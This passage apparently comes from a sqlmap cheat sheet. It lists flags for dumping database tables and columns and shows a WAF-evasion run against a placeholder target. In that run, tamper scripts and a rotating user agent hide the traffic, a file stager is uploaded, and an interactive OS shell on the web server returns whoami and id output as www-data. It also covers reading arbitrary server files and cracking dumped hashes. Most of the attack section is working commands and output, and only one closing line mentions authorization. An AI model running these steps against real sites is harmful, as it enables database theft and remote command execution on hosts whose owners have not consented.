FLAGS
-T Target a specific table
--columns List columns for that table
-C Dump only these columns (comma separated)
--dump Extract actual row data from the table
--dump-all Dump every table of every database. Loud.
OVERVIEW
The payoff. Pick a table, pick columns, and pull real data. Use -C to stay surgical
instead of dumping everything. Hashes get auto-detected and offered for
cracking.

WAF Bypass & Shell Access
eee
$ sqlmap -u "http://target.com/item?id=1" \
--tamper=space2comment,between \
--random-agent --proxy=http://127.0.0.1:8080 \
--os-shell
[INFO] loading tamper scripts: space2comment, between
[INFO] setting random HTTP User-Agent header
[INFO] routing traffic via 127.0.0.1:8080
[INFO] going to upload the file stager
[INFO] the file stager has been successfully uploaded
os-shell> whoami
www-data
os-shell> id
uid=33(www-data) gid=33(www-data) groups=33
FLAGS
--tamper Chain obfuscation scripts to bypass WAFS
--random-agent Rotate areal browser User-Agent per run
--proxy Route through Burp or a SOCKS/HTTP proxy
--os-shell Drop into an interactive OS shell via the DB
--sql-shell Run raw SQL queries interactively
--file-read Read arbitrary files from the DB server
OVERVIEW
Top shelf SQLMap. Tamper scripts slip past WAFs, a proxy keeps everything in
Burp, and --os-shell turns a DB bug into RCE on the host. Use only on systems
you are authorized to test.
